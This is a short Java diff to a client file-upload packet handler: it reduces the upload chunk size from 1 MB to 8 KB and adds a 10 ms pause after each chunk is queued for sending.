@@ -29,7 +29,7 @@ public class Packet21ClientUploadFile extends AbstractIncomingPacket {
 				public void run() {
 					try {			
 						FileInputStream fileInput = new FileInputStream(file);
-						byte[] chunk = new byte[1024 * 1024];
+						byte[] chunk = new byte[1024 * 8];
 
 						int read;
 						while ((read = fileInput.read(chunk)) != -1) {
@@ -44,6 +44,7 @@ public class Packet21ClientUploadFile extends AbstractIncomingPacket {
 							}
 							AbstractOutgoingPacket packet = new Packet29ClientUploadPart(file, chunk, read);
 							Connection.instance.addToSendQueue(packet);
+							Thread.sleep(10L);
 						}
 						fileInput.close();
 						
